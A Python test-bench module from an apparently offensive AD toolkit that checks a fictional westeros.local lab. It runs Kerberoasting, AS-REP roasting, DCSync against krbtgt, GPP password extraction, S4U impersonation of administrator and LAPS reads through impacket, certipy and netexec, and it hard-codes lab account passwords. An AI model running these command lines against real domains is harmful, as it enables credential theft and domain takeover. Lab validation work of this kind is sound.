"""
Iron Throne Lab — Comprehensive Test Bench
Validates all uwu-toolkit AD modules against the westeros.local lab
Runs impacket, bloodyAD, certipy, and netexec validation in sequence
"""

import os
import time
from typing import Dict, List
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class IronThroneBench(ModuleBase):
    """
    Comprehensive test bench for the Iron Throne AD lab.
    Exercises every uwu-toolkit AD capability against westeros.local.

    Modes:
    - connectivity: Test network + auth only
    - tools: Validate all tool binaries exist
    - enum: Run enumeration tools
    - attacks: Run non-destructive attack simulations
    - full: Run everything

    This module orchestrates the other validation modules and adds
    lab-specific tests for the Iron Throne environment.
    """

    def __init__(self):
        super().__init__()
        self.name = "iron_throne_bench"
        self.description = "Iron Throne lab test bench - validate all AD tools"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "test", "bench", "iron_throne", "westeros", "validate"]
        self.references = []

        # Iron Throne lab defaults
        self.register_option("RHOSTS", "Domain Controller IP", required=True, default="10.2.10.1")
        self.register_option("DOMAIN", "Domain name", required=True, default="westeros.local")
        self.register_option("USER", "Low-priv domain user", required=True, default="ned")
        self.register_option("PASS", "User password", required=True, default="Winter123!")
        self.register_option("DA_USER", "Domain Admin user", default="tywin")
        self.register_option("DA_PASS", "Domain Admin password", default="GoldMine1!")
        self.register_option("DC_INTERNAL", "DC internal IP (pivot network)", default="192.168.2.1")
        self.register_option("WINTERFELL", "Workstation IP", default="10.2.10.20")
        self.register_option("DRAGONSTONE", "Linux pivot IP", default="10.2.10.10")
        self.register_option("SQL_USER", "MSSQL user", default="tyrion")
        self.register_option("SQL_PASS", "MSSQL password", default="Imp12345!")

        # Test control
        self.register_option("MODE", "Test mode",
                           default="connectivity",
                           choices=["connectivity", "tools", "enum", "attacks", "full"])
        self.register_option("VERBOSE", "Verbose output", default="no",
                           choices=["yes", "no"])

    # All Iron Throne users for validation
    LAB_USERS = {
        "ned": "Winter123!",
        "arya": "Needle123!",
        "sansa": "Lemon123!",
        "jon": "Ghost1234!",
        "bran": "ThreeEyed1!",
        "cersei": "Wildfire1!",
        "jaime": "Kingslayer1!",
        "tyrion": "Imp12345!",
        "tywin": "GoldMine1!",
        "joffrey": "Crown1234!",
        "daenerys": "Dracarys1!",
        "viserys": "Dragon123!",
        "missandei": "Freedom1!",
        "jorah": "Khaleesi1!",
        "greyworm": "Spear1234!",
        "theon": "Reek12345!",
        "euron": "Silence1!",
        "yara": "IronPrice1!",
        "balon": "Pyke12345!",
        "victarion": "Kraken123!",
    }

    SVC_ACCOUNTS = {
        "svc_goldcloaks": "GoldCloak1!",
        "svc_maesters": "Oldtown1!",
        "svc_wildfire": "BurnThemAll!",
        "svc_kingsguard": "Protect1!",
        "svc_faceless": "Valar1234!",
        "svc_nightswatch": "TheWall1!",
        "svc_sqlfire": "Dragonfire1!",
        "svc_backup": "Backup123!",
    }

    EXPECTED_GROUPS = [
        "Northmen", "Maesters", "Kingsguard", "Unsullied",
        "SmallCouncil", "LannisterGuard", "NightsWatch", "Ironborn",
        "CrownLoyalists", "LAPSReaders", "DragonRiders", "FacelessMen",
    ]

    def run(self) -> bool:
        mode = self.get_option("MODE")
        verbose = self.get_option("VERBOSE") == "yes"

        self.print_line()
        self.print_status("THE IRON THRONE — Lab Test Bench")
        self.print_status("westeros.local — uwu-toolkit validation")
        self.print_line("=" * 60)

        results = {"pass": [], "fail": [], "skip": []}
        start_time = time.time()

        # Always run connectivity
        self._test_connectivity(results, verbose)

        if mode == "connectivity":
            self._print_final_summary(results, start_time)
            return len(results["fail"]) == 0

        if mode in ("tools", "full"):
            self.print_line()
            self._test_tools(results, verbose)

        if mode in ("enum", "full"):
            self.print_line()
            self._test_enumeration(results, verbose)

        if mode in ("attacks", "full"):
            self.print_line()
            self._test_attacks(results, verbose)

        self._print_final_summary(results, start_time)
        return len(results["fail"]) == 0

    def _test_connectivity(self, results: Dict, verbose: bool):
        """Test network connectivity and authentication"""
        self.print_status("CONNECTIVITY TESTS")
        self.print_line("-" * 40)

        dc_ip = self.get_option("RHOSTS")
        dc_internal = self.get_option("DC_INTERNAL")
        winterfell = self.get_option("WINTERFELL")
        dragonstone = self.get_option("DRAGONSTONE")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")

        # Ping tests
        hosts = {
            "DC (external)": dc_ip,
            "DC (internal)": dc_internal,
            "WINTERFELL": winterfell,
            "DRAGONSTONE": dragonstone,
        }
        for name, ip in hosts.items():
            if not ip:
                continue
            ret, stdout, stderr = self.run_in_exegol(f"ping -c 1 -W 2 {ip} 2>&1", timeout=10)
            if ret == 0:
                results["pass"].append(f"[PING] {name} ({ip})")
                self.print_good(f"Ping {name:<20} ({ip}): OK")
            else:
                results["fail"].append(f"[PING] {name} ({ip})")
                self.print_error(f"Ping {name:<20} ({ip}): FAILED")

        # Port checks on DC
        self.print_line()
        ports = {
            "LDAP": 389,
            "LDAPS": 636,
            "Kerberos": 88,
            "SMB": 445,
            "RPC": 135,
            "DNS": 53,
            "WinRM": 5985,
            "MSSQL": 1433,
            "HTTP (ADCS)": 80,
        }
        for svc, port in ports.items():
            ret, stdout, stderr = self.run_in_exegol(
                f"bash -c 'echo > /dev/tcp/{dc_ip}/{port}' 2>&1 || "
                f"timeout 3 nc -z {dc_ip} {port} 2>&1",
                timeout=10
            )
            if ret == 0:
                results["pass"].append(f"[PORT] {svc} ({dc_ip}:{port})")
                self.print_good(f"Port {svc:<15} ({dc_ip}:{port}): OPEN")
            else:
                results["skip"].append(f"[PORT] {svc} ({dc_ip}:{port})")
                self.print_warning(f"Port {svc:<15} ({dc_ip}:{port}): CLOSED/FILTERED")

        # LDAP authentication
        self.print_line()
        self.print_status("Testing LDAP authentication...")
        ret, stdout, stderr = self.run_in_exegol(
            f"ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{password}' -b '' -s base namingContexts 2>&1",
            timeout=15
        )
        output = stdout + stderr
        if "namingContexts" in output or "DC=" in output:
            results["pass"].append("[AUTH] LDAP bind")
            self.print_good("LDAP authentication: OK")
        else:
            results["fail"].append("[AUTH] LDAP bind failed")
            self.print_error("LDAP authentication: FAILED")
            if verbose:
                self.print_line(f"    {output[:200]}")

        # Kerberos TGT
        self.print_status("Testing Kerberos TGT request...")
        ret, stdout, stderr = self.run_in_exegol(
            f"getTGT.py '{domain}/{user}:{password}' -dc-ip {dc_ip} 2>&1",
            timeout=15
        )
        output = stdout + stderr
        if ".ccache" in output or "Saving ticket" in output:
            results["pass"].append("[AUTH] Kerberos TGT")
            self.print_good("Kerberos TGT: OK")
        else:
            results["fail"].append("[AUTH] Kerberos TGT failed")
            self.print_error("Kerberos TGT: FAILED")
            if verbose:
                self.print_line(f"    {output[:200]}")

        # SMB auth via nxc
        self.print_status("Testing SMB authentication (nxc)...")
        ret, stdout, stderr = self.run_in_exegol(
            f"nxc smb {dc_ip} -u '{user}' -p '{password}' -d '{domain}' 2>&1",
            timeout=15
        )
        output = stdout + stderr
        if "[+]" in output or "Pwn3d" in output:
            results["pass"].append("[AUTH] SMB (nxc)")
            self.print_good("SMB authentication (nxc): OK")
        elif "[-]" in output:
            results["fail"].append("[AUTH] SMB auth failed")
            self.print_error("SMB authentication: FAILED")
        else:
            results["skip"].append("[AUTH] SMB unclear")
            self.print_warning("SMB authentication: unclear")

    def _test_tools(self, results: Dict, verbose: bool):
        """Validate all tool binaries are present"""
        self.print_status("TOOL AVAILABILITY")
        self.print_line("-" * 40)

        tools = [
            # Impacket
            "GetUserSPNs.py", "GetNPUsers.py", "getTGT.py", "getST.py",
            "secretsdump.py", "psexec.py", "smbexec.py", "wmiexec.py",
            "dcomexec.py", "atexec.py", "smbclient.py", "mssqlclient.py",
            "addcomputer.py", "rbcd.py", "dacledit.py", "owneredit.py",
            "ntlmrelayx.py", "findDelegation.py", "lookupsid.py",
            "rpcdump.py", "samrdump.py", "ticketer.py", "dpapi.py",
            "Get-GPPPassword.py", "GetLAPSPassword.py",
            # BloodyAD
            "bloodyAD",
            # NetExec
            "nxc", "netexec",
            # Other
            "nmap", "ldapsearch", "smbclient", "rpcclient",
            "chisel", "proxychains4",
        ]

        found = 0
        missing = 0
        for tool in tools:
            path = find_tool(tool)
            if path:
                found += 1
                if verbose:
                    self.print_good(f"{tool:<25} {path}")
                results["pass"].append(f"[TOOL] {tool}")
            else:
                # Check Exegol
                ret, stdout, stderr = self.run_in_exegol(f"which {tool} 2>/dev/null", timeout=5)
                if ret == 0 and stdout.strip():
                    found += 1
                    if verbose:
                        self.print_good(f"{tool:<25} {stdout.strip()} (exegol)")
                    results["pass"].append(f"[TOOL] {tool} (exegol)")
                else:
                    missing += 1
                    self.print_error(f"{tool:<25} NOT FOUND")
                    results["fail"].append(f"[TOOL-MISSING] {tool}")

        # Special case: certipy (lives in venv, not on standard PATH)
        certipy_paths = [
            "/opt/tools/Certipy/venv/bin/certipy",
            "/root/.local/share/pipx/venvs/netexec/bin/certipy",
            "/root/.local/share/pipx/venvs/certsync/bin/certipy",
        ]
        certipy_found = False
        for cp in certipy_paths:
            ret, stdout, stderr = self.run_in_exegol(f"test -f {cp} && echo FOUND", timeout=5)
            if "FOUND" in stdout:
                found += 1
                if verbose:
                    self.print_good(f"{'certipy':<25} {cp}")
                else:
                    self.print_good(f"{'certipy':<25} OK (venv)")
                results["pass"].append(f"[TOOL] certipy ({cp})")
                certipy_found = True
                break
        if not certipy_found:
            missing += 1
            self.print_error(f"{'certipy':<25} NOT FOUND")
            results["fail"].append("[TOOL-MISSING] certipy")

        self.print_line()
        self.print_status(f"Tools: {found} found, {missing} missing")

    def _test_enumeration(self, results: Dict, verbose: bool):
        """Test enumeration capabilities"""
        self.print_status("ENUMERATION TESTS")
        self.print_line("-" * 40)

        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")

        # Kerberoast — validate expected SPN users
        self.print_status("Kerberoast enumeration...")
        ret, stdout, stderr = self.run_in_exegol(
            f"GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip}",
            timeout=30
        )
        output = stdout + stderr
        expected_spn_users = ["svc_goldcloaks", "svc_maesters", "svc_wildfire",
                              "svc_kingsguard", "svc_faceless", "svc_nightswatch", "svc_sqlfire"]
        found_spns = [u for u in expected_spn_users if u in output]
        if found_spns:
            results["pass"].append(f"[ENUM] Kerberoast: {len(found_spns)}/{len(expected_spn_users)} SPN users")
            self.print_good(f"Kerberoast: found {len(found_spns)}/{len(expected_spn_users)} expected SPN users")
            if verbose:
                for u in found_spns:
                    self.print_line(f"    {u}")
        elif "ServicePrincipalName" in output:
            results["skip"].append("[ENUM] Kerberoast: table shown but expected users not found")
            self.print_warning("Kerberoast: output received but expected users not matched")
        else:
            results["fail"].append("[ENUM] Kerberoast: no output")
            self.print_error("Kerberoast: no output")

        # AS-REP Roast — validate ned is vulnerable
        self.print_status("AS-REP Roast enumeration...")
        ret, stdout, stderr = self.run_in_exegol(
            f"GetNPUsers.py '{domain}/{user}:{password}' -dc-ip {dc_ip}",
            timeout=30
        )
        output = stdout + stderr
        if "ned" in output or "$krb5asrep$" in output:
            results["pass"].append("[ENUM] AS-REP Roast: ned found")
            self.print_good("AS-REP Roast: ned is DONT_REQUIRE_PREAUTH (expected)")
        else:
            results["skip"].append("[ENUM] AS-REP Roast: ned not found")
            self.print_warning("AS-REP Roast: ned not detected as vulnerable")

        # bloodyAD writable objects
        self.print_status("BloodyAD writable enumeration...")
        ret, stdout, stderr = self.run_in_exegol(
            f"bloodyAD -u '{user}' -p '{password}' -d '{domain}' --host {dc_ip} get writable --detail",
            timeout=60
        )
        output = stdout + stderr
        if "distinguishedName" in output or "WRITE" in output:
            results["pass"].append("[ENUM] BloodyAD writable")
            self.print_good("BloodyAD writable: found writable objects")
        elif "Traceback" in output:
            results["fail"].append("[ENUM] BloodyAD writable: Python error")
            self.print_error("BloodyAD writable: Python error")
            if verbose:
                lines = output.strip().split('\n')
                for line in lines[-3:]:
                    self.print_line(f"    {line}")
        else:
            results["skip"].append("[ENUM] BloodyAD writable: no results")
            self.print_warning("BloodyAD writable: no writable objects found for this user")

        # Certipy find
        self.print_status("Certipy ADCS enumeration...")
        ret, stdout, stderr = self.run_in_exegol(
            f"certipy find -u '{user}@{domain}' -p '{password}' -dc-ip {dc_ip} -stdout -vulnerable 2>&1",
            timeout=120
        )
        output = stdout + stderr
        expected_templates = ["KingsRoad", "WildFire", "FacelessMen", "Citadel",
                            "WhiteWalker", "WinterIsComing", "Valyria", "DoomOfValyria"]
        found_templates = [t for t in expected_templates if t in output]
        if "ESC" in output:
            results["pass"].append(f"[ENUM] Certipy: found ESC vulns ({len(found_templates)} templates)")
            self.print_good(f"Certipy: found ESC vulnerabilities ({len(found_templates)} expected templates)")
        elif "CA Name" in output:
            results["pass"].append("[ENUM] Certipy: CA found")
            self.print_good("Certipy: CA found (no ESC vulns detected)")
        elif "Traceback" in output:
            results["fail"].append("[ENUM] Certipy: Python error")
            self.print_error("Certipy: Python error")
        else:
            results["skip"].append("[ENUM] Certipy: no ADCS results")
            self.print_warning("Certipy: no ADCS results")

        # SMB shares
        self.print_status("SMB share enumeration (nxc)...")
        ret, stdout, stderr = self.run_in_exegol(
            f"nxc smb {dc_ip} -u '{user}' -p '{password}' -d '{domain}' --shares 2>&1",
            timeout=30
        )
        output = stdout + stderr
        expected_shares = ["scripts", "backup", "smallcouncil", "maesters_library", "throne_room"]
        found_shares = [s for s in expected_shares if s.lower() in output.lower()]
        if found_shares:
            results["pass"].append(f"[ENUM] Shares: {len(found_shares)}/{len(expected_shares)} found")
            self.print_good(f"SMB shares: {len(found_shares)}/{len(expected_shares)} expected shares")
        elif "SYSVOL" in output or "NETLOGON" in output:
            results["pass"].append("[ENUM] Shares: default shares visible")
            self.print_good("SMB shares: default shares visible (custom shares may not be created yet)")
        else:
            results["skip"].append("[ENUM] Shares: no share data")
            self.print_warning("SMB shares: could not enumerate")

        # Delegation
        self.print_status("Delegation enumeration...")
        ret, stdout, stderr = self.run_in_exegol(
            f"findDelegation.py '{domain}/{user}:{password}' -dc-ip {dc_ip} 2>&1",
            timeout=30
        )
        output = stdout + stderr
        expected_deleg = ["jorah", "svc_faceless", "svc_wildfire"]
        found_deleg = [d for d in expected_deleg if d in output]
        if found_deleg:
            results["pass"].append(f"[ENUM] Delegation: {len(found_deleg)}/{len(expected_deleg)} found")
            self.print_good(f"Delegation: {len(found_deleg)}/{len(expected_deleg)} expected delegations")
        elif "AccountName" in output:
            results["pass"].append("[ENUM] Delegation: table output received")
            self.print_good("Delegation: output received")
        else:
            results["skip"].append("[ENUM] Delegation: no output")
            self.print_warning("Delegation: no delegation configs found")

        # GPP Passwords
        self.print_status("GPP Password extraction...")
        ret, stdout, stderr = self.run_in_exegol(
            f"Get-GPPPassword.py '{domain}/{user}:{password}'@{dc_ip} 2>&1",
            timeout=30
        )
        output = stdout + stderr
        if "cpassword" in output.lower() or "password" in output.lower():
            results["pass"].append("[ENUM] GPP Passwords found")
            self.print_good("GPP Passwords: credentials found in SYSVOL")
        else:
            results["skip"].append("[ENUM] GPP Passwords: none found")
            self.print_warning("GPP Passwords: none found")

    def _test_attacks(self, results: Dict, verbose: bool):
        """Test non-destructive attack simulations"""
        self.print_status("ATTACK SIMULATION TESTS (non-destructive)")
        self.print_line("-" * 40)

        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        da_user = self.get_option("DA_USER")
        da_pass = self.get_option("DA_PASS")
        sql_user = self.get_option("SQL_USER")
        sql_pass = self.get_option("SQL_PASS")

        # Kerberoast with hash retrieval
        self.print_status("Kerberoast hash retrieval...")
        ret, stdout, stderr = self.run_in_exegol(
            f"GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request 2>&1",
            timeout=60
        )
        output = stdout + stderr
        hash_count = output.count("$krb5tgs$")
        if hash_count > 0:
            results["pass"].append(f"[ATTACK] Kerberoast: {hash_count} hashes")
            self.print_good(f"Kerberoast: retrieved {hash_count} TGS hash(es)")
        else:
            results["skip"].append("[ATTACK] Kerberoast: no hashes")
            self.print_warning("Kerberoast: no hashes retrieved")

        # AS-REP Roast with hash
        self.print_status("AS-REP Roast hash retrieval (ned)...")
        ret, stdout, stderr = self.run_in_exegol(
            f"GetNPUsers.py '{domain}/' -dc-ip {dc_ip} -usersfile <(echo ned) -format hashcat 2>&1",
            timeout=30
        )
        output = stdout + stderr
        if "$krb5asrep$" in output:
            results["pass"].append("[ATTACK] AS-REP Roast: ned hash retrieved")
            self.print_good("AS-REP Roast: ned hash retrieved")
        else:
            # Try alternative approach
            ret2, stdout2, stderr2 = self.run_in_exegol(
                f"GetNPUsers.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request 2>&1",
                timeout=30
            )
            if "$krb5asrep$" in (stdout2 + stderr2):
                results["pass"].append("[ATTACK] AS-REP Roast: hash retrieved (authenticated)")
                self.print_good("AS-REP Roast: hash retrieved (authenticated mode)")
            else:
                results["skip"].append("[ATTACK] AS-REP Roast: no hash")
                self.print_warning("AS-REP Roast: no hash retrieved")

        # DCSync (if DA creds provided)
        if da_user and da_pass:
            self.print_status(f"DCSync test (as {da_user})...")
            ret, stdout, stderr = self.run_in_exegol(
                f"secretsdump.py '{domain}/{da_user}:{da_pass}'@{dc_ip} -just-dc-user krbtgt 2>&1",
                timeout=120
            )
            output = stdout + stderr
            if "krbtgt" in output.lower() and ":::" in output:
                results["pass"].append("[ATTACK] DCSync krbtgt OK")
                self.print_good("DCSync: krbtgt hash extracted")
            else:
                results["skip"].append("[ATTACK] DCSync: failed or no access")
                self.print_warning("DCSync: could not extract krbtgt")

            # Also test with jon (DCSync rights in lab)
            self.print_status("DCSync test (as jon — has DCSync rights)...")
            ret, stdout, stderr = self.run_in_exegol(
                f"secretsdump.py '{domain}/jon:Ghost1234!'@{dc_ip} -just-dc-user krbtgt 2>&1",
                timeout=120
            )
            output = stdout + stderr
            if "krbtgt" in output.lower() and ":::" in output:
                results["pass"].append("[ATTACK] DCSync as jon: krbtgt extracted")
                self.print_good("DCSync (jon): krbtgt hash extracted — DCSync edge confirmed")
            else:
                results["skip"].append("[ATTACK] DCSync as jon: failed")
                self.print_warning("DCSync (jon): failed (DCSync ACL may not be configured)")

        # MSSQL
        if sql_user and sql_pass:
            self.print_status("MSSQL connection test...")
            ret, stdout, stderr = self.run_in_exegol(
                f"mssqlclient.py '{domain}/{sql_user}:{sql_pass}'@{dc_ip} -windows-auth -Q 'SELECT SYSTEM_USER' 2>&1",
                timeout=30
            )
            output = stdout + stderr
            if sql_user in output.lower() or "SQL" in output:
                results["pass"].append("[ATTACK] MSSQL: connected")
                self.print_good(f"MSSQL: connected as {sql_user}")
            else:
                results["skip"].append("[ATTACK] MSSQL: could not connect")
                self.print_warning("MSSQL: could not connect")

        # S4U delegation test (jorah -> cifs/KINGSLANDING)
        self.print_status("S4U delegation test (jorah)...")
        ret, stdout, stderr = self.run_in_exegol(
            f"getST.py -spn 'cifs/KINGSLANDING.{domain}' '{domain}/jorah:Khaleesi1!' "
            f"-impersonate administrator -dc-ip {dc_ip} 2>&1",
            timeout=30
        )
        output = stdout + stderr
        if ".ccache" in output or "Saving ticket" in output:
            results["pass"].append("[ATTACK] S4U delegation: jorah -> cifs/KINGSLANDING")
            self.print_good("S4U delegation: jorah constrained delegation works")
        else:
            results["skip"].append("[ATTACK] S4U delegation: failed")
            self.print_warning("S4U delegation: could not get service ticket")

        # LAPS password read (missandei)
        self.print_status("LAPS password read (missandei)...")
        winterfell = self.get_option("WINTERFELL")
        ret, stdout, stderr = self.run_in_exegol(
            f"nxc ldap {dc_ip} -u 'missandei' -p 'Freedom1!' -d '{domain}' -M laps 2>&1",
            timeout=30
        )
        output = stdout + stderr
        if "password" in output.lower() and "WINTERFELL" in output.upper():
            results["pass"].append("[ATTACK] LAPS: password read")
            self.print_good("LAPS: WINTERFELL password read by missandei")
        else:
            results["skip"].append("[ATTACK] LAPS: could not read")
            self.print_warning("LAPS: could not read (may not be configured yet)")

    def _print_final_summary(self, results: Dict, start_time: float):
        """Print comprehensive test summary"""
        elapsed = time.time() - start_time
        total = len(results["pass"]) + len(results["fail"]) + len(results["skip"])

        self.print_line()
        self.print_line("=" * 60)
        self.print_status("IRON THRONE — TEST BENCH RESULTS")
        self.print_line("=" * 60)
        self.print_good(f"PASS:  {len(results['pass'])}")
        if results["fail"]:
            self.print_error(f"FAIL:  {len(results['fail'])}")
            for f in results["fail"]:
                self.print_error(f"  {f}")
        if results["skip"]:
            self.print_warning(f"SKIP:  {len(results['skip'])}")
        self.print_line(f"TOTAL: {total} tests in {elapsed:.1f}s")
        self.print_line("=" * 60)

        # Overall verdict
        if len(results["fail"]) == 0:
            self.print_good("VERDICT: All tests passed!")
        elif len(results["fail"]) <= 3:
            self.print_warning(f"VERDICT: {len(results['fail'])} failure(s) — review above")
        else:
            self.print_error(f"VERDICT: {len(results['fail'])} failures — lab may not be fully configured")

    def check(self) -> bool:
        """Quick connectivity check"""
        dc_ip = self.get_option("RHOSTS")
        ret, stdout, stderr = self.run_in_exegol(f"ping -c 1 -W 2 {dc_ip} 2>&1", timeout=5)
        return ret == 0
